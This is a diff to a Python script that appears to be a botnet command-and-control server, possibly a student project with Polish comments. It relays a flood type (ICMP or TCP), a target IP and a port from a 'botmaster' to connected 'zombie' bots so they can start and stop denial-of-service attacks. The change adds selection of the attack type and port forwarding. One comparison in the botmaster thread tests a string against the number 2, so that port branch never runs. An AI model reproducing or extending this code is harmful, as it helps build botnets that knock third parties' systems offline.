@@ -9,23 +9,26 @@ ip = '192.168.100.19'
 sqlDatabaseHosts = []
 sqlDatabaseTargetIP = []
 clientSockets = []
+attack_type = ''
+port = ''
 
 
 def thread_for_botmaster(c, st):  # wrzucic w while???
     global startAttack
     global ip
+    global attack_type
+    global port
     print('Botmaster Connected')
 
-    # todo:odebrac rodzaj ataku od botmastera
-    # 1-icmp flood
-    # 2-Tcp Flood
-    # if rec == 1:
-    #   attack_type = 'icmp_flood'
-    # if rec == 2:
-    #   attack_type = 'tcp_flood'
+    attack_type = str(c.recv(1).decode())
 
     ip = str(c.recv(16).decode())
     print('received target ip=' + ip)
+
+    if attack_type == 2:
+        port = str(c.recv(4).decode())
+        print('received target port=' + port)
+
     sqlDatabaseTargetIP.append(ip)
     startAttack = True
     stop = str(c.recv(1).decode())
@@ -47,7 +50,7 @@ def thread_for_zombieBot(c, addr):
             if pom == 1:  # pom == 1 indicates that the botmaster wants to stop an ongoing attack
                 c.send('0'.encode())
                 print('ending attack')
-                c.send(ip.encode())
+                c.send(ip.encode())  # new server ip
                 pom = 0
                 return
                 # if an attack stoped send IP of the new server (from botmaster)
@@ -57,9 +60,12 @@ def thread_for_zombieBot(c, addr):
 
         try:
             # todo:w zaleznosci od ataku wyslij odpowiedni identyfikator tj. 1,2,3 itd
-            c.send('1'.encode())
+            c.send(attack_type.encode())
             time.sleep(0.5)
             c.send(ip.encode())
+            if attack_type == '2':
+                c.send(port.encode())
+
             pom = 1
         except:
             print("Bot is disconnected")
@@ -126,7 +132,7 @@ if __name__ == '__main__':
     try:
         while True:
             if x == 0:
-                t = threading.Thread(target=thread_for_checking_attack_status,daemon=True)
+                t = threading.Thread(target=thread_for_checking_attack_status, daemon=True)
                 t.start()
                 thread_array.append(t)
                 x = 1
@@ -141,13 +147,13 @@ if __name__ == '__main__':
 
                     sqlDatabaseHosts.append(client_socket.getpeername())
                     print(sqlDatabaseHosts)
-                    t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr),daemon=True)
+                    t1 = threading.Thread(target=thread_for_zombieBot, args=(client_socket, addr), daemon=True)
                     t1.start()
                     thread_array.append(t1)
                 elif int(data) == 2:
                     # todo: można zrobić jakiś proces logowania i walidacje
                     #
-                    t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr),daemon=True)
+                    t2 = threading.Thread(target=thread_for_botmaster, args=(client_socket, addr), daemon=True)
                     t2.start()
                     thread_array.append(t2)
                 else:
